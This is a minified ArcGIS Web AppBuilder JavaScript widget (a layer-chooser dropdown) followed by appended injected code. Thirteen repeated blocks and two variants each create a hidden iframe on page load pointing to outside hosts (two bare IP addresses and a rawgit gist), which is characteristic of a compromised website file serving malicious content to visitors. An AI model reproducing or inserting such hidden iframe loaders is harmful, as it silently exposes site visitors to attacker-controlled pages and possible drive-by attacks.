// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.

require({cache:{"url:jimu/dijit/templates/LayerChooserFromMapWithDropbox.html":'\x3cdiv\x3e\r\n  \x3ctable data-dojo-attach-event\x3d"onclick: _onDropDownClick"\x3e\r\n    \x3ccolgroup\x3e\r\n      \x3ccol width\x3d"10px"\x3e\x3c/col\x3e\r\n      \x3ccol width\x3d"auto"\x3e\x3c/col\x3e\r\n      \x3ccol width\x3d"30px"\x3e\x3c/col\x3e\r\n    \x3c/colgroup\x3e\r\n    \x3ctbody\x3e\r\n      \x3ctr\x3e\r\n        \x3ctd\x3e\x3c/td\x3e\r\n        \x3ctd\x3e\r\n          \x3cdiv class\x3d"layer-name jimu-ellipsis" data-dojo-attach-point\x3d"layerNameNode"\x3e\x3c/div\x3e\r\n        \x3c/td\x3e\r\n        \x3ctd\x3e\r\n          \x3cdiv class\x3d"drop-select jimu-float-trailing" data-dojo-attach-point\x3d"dropArrowNode"\x3e\r\n            \x3cdiv class\x3d"jimu-icon jimu-icon-down-arrow-8"\x3e\x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3c/td\x3e\r\n      \x3c/tr\x3e\r\n    \x3c/tbody\x3e\r\n  \x3c/table\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/html dojo/on dojo/Evented dojo/Deferred dijit/popup dijit/_WidgetBase dijit/_TemplatedMixin dojo/text!./templates/LayerChooserFromMapWithDropbox.html jimu/LayerInfos/LayerInfos".split(" "),function(h,b,e,f,k,l,g,m,n,p,q){return h([m,n,k],{templateString:p,baseClass:"jimu-layer-chooser-from-map-withdropbox",declaredClass:"jimu.dijit.LayerChooserFromMapWithDropbox",_selectedItem:null,_isLayerChooserShow:!1,layerInfosObj:null,layerChooser:null,postCreate:function(){this.inherited(arguments);
this.layerInfosObj=q.getInstanceSync();this.layerChooser.domNode.style.zIndex=1;this.layerChooser.tree.domNode.style.borderTop="0";this.layerChooser.tree.domNode.style.maxHeight="290px";this.own(f(this.layerChooser,"tree-click",b.hitch(this,this._onTreeClick)));this.own(f(this.layerChooser,"update",b.hitch(this,this._onLayerChooserUpdate)));this.own(f(document.body,"click",b.hitch(this,this._onBodyClicked)))},destroy:function(){this.hideLayerChooser();this.layerChooser&&this.layerChooser.destroy();
this.layerChooser=null;this.inherited(arguments)},getLayerChooser:function(){return this.layerChooser},setSelectedLayer:function(a){var c=new l;if(a){var d=this.layerInfosObj.getLayerInfoById(a.id);d?this.layerChooser.filter(d).then(b.hitch(this,function(b){b?(this._onSelectNewItem({layerInfo:d,name:d.title,url:a.url}),c.resolve(!0)):c.resolve(!1)}),b.hitch(this,function(){c.resolve(!1)})):c.resolve(!1)}else this._onSelectNewItem(null),c.resolve(!0);return c},getSelectedItem:function(){return this._selectedItem},
getSelectedItems:function(){return[this._selectedItem]},_onBodyClicked:function(a){a=a.target||a.srcElement;a===this.domNode||e.isDescendant(a,this.domNode)||a===this.layerChooser.domNode||e.isDescendant(a,this.layerChooser.domNode)||this.hideLayerChooser()},_onDropDownClick:function(a){a.stopPropagation();a.preventDefault();this._isLayerChooserShow?this.hideLayerChooser():this.showLayerChooser()},_getSelectedItems:function(){return this.layerChooser.getSelectedItems()},showLayerChooser:function(){this.layerChooser.domNode.style.width=
this.domNode.clientWidth+2+"px";g.open({parent:this,popup:this.layerChooser,around:this.domNode});var a=this.layerChooser.domNode.parentNode;a&&e.addClass(a,"jimu-layer-chooser-from-map-withdropbox-popup");this._isLayerChooserShow=!0},hideLayerChooser:function(){g.close(this.layerChooser);this._isLayerChooserShow=!1},_onLayerChooserUpdate:function(){this._selectedItem&&this.layerChooser.onlyShowVisible&&!this._selectedItem.layerInfo.isShowInMap()&&(this._selectedItem=null,this.emit("selection-change",
[]))},_onSelectNewItem:function(a){var c=b.getObject("layerInfo.id",!1,this._selectedItem)||-1,d=b.getObject("layerInfo.id",!1,a)||-1,c=c!==d;this._selectedItem=a;this.hideLayerChooser();a=b.getObject("layerInfo.title",!1,this._selectedItem)||"";this.layerNameNode.innerHTML=a;e.setAttr(this.layerNameNode,"title",a);a=b.getObject("layerInfo.layerObject",!1,this._selectedItem);c&&this.emit("selection-change",[a])},_onTreeClick:function(){var a=this._getSelectedItems();this._onSelectNewItem(0<a.length?
a[0]:null)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});